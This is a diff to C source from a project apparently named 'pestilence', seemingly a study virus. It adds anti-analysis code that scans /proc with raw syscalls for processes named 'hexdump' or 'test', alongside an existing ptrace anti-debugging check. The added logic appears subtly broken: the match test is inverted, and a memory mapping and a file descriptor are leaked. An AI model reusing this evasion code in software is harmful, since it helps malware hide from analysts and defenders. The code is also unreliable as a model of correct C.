@@ -1,9 +1,12 @@
 #include <signal.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <dirent.h>
+#include <sys/mman.h>
 
 #include "pestilence.h"
 #include "syscall.h"
+#include "utils.h"
 
 int64_t gen_key_64(void) {
 
@@ -64,4 +67,105 @@ int	check_ptrace(void)
 	if (_syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0) == -1)
 		return (1);
 	return (0);
+}
+
+/* open /proc/ directory and check if the process in char forbidden[] is running 
+ * example /proc/1/comm
+ */
+
+static int check_proc(const char *dir_path) {
+
+	struct stat st;
+	const char *forbidden[] = {"hexdump", "test"};
+	const size_t forbidden_size = sizeof(forbidden) / sizeof(forbidden[0]);
+
+	int fd = _syscall(SYS_open, dir_path, O_RDONLY);
+
+	if (fd == -1)
+		return 1;
+
+	if (_syscall(SYS_fstat, fd, &st) == -1) {
+		_syscall(SYS_close, fd);
+		return 1;
+	}
+
+
+	uint8_t* file = (uint8_t *)_syscall(SYS_mmap, 0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+
+	if (file == MAP_FAILED)
+		return 1;
+
+	_syscall(SYS_close, fd);
+
+	for (size_t i = 0; i < forbidden_size; ++i) {
+		if (ft_memcmp(file, forbidden[i], ft_strlen(forbidden[i])) == 0) {
+			_syscall(SYS_munmap, file, st.st_size);
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+static int check_digit(const char *str) {
+	for (size_t i = 0; str[i]; i++) {
+		if (str[i] < '0' || str[i] > '9')
+			return 1;
+	}
+	return 0;
+}
+
+static int open_proc(void)
+{
+	const char proc[] = "/proc";
+
+	int fd = _syscall(SYS_open, "/proc", O_RDONLY);
+
+	if (fd == -1)
+		return 1;
+
+	char buf[PATH_MAX];
+	struct dirent *dir;
+	ssize_t ret;
+
+	for(;;)
+	{
+		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
+		if (ret <= 0)
+			break;
+		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
+		{
+			dir = (struct dirent *)(buf + i);
+
+			if (dir->d_name[0] == '.'
+				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
+				continue;
+
+			if (dir->d_type == DT_DIR && check_digit(dir->d_name) == 0) {
+
+				char new_path[PATH_MAX];
+
+				char comm[] = "/comm";
+				char slash[] = "/";
+
+				ft_strcpy(new_path, proc);
+				ft_strlcat(new_path, slash, PATH_MAX);
+				ft_strlcat(new_path, dir->d_name, PATH_MAX);
+				ft_strlcat(new_path, comm, PATH_MAX);
+
+				if (check_proc(new_path) == 0) {
+					return 1;
+				}
+			}
+		}
+	}
+
+	return 0;
+}
+
+int forbid_proc(void)
+{
+	if (open_proc() != 0)
+		return 1;
+	return 0;
 }
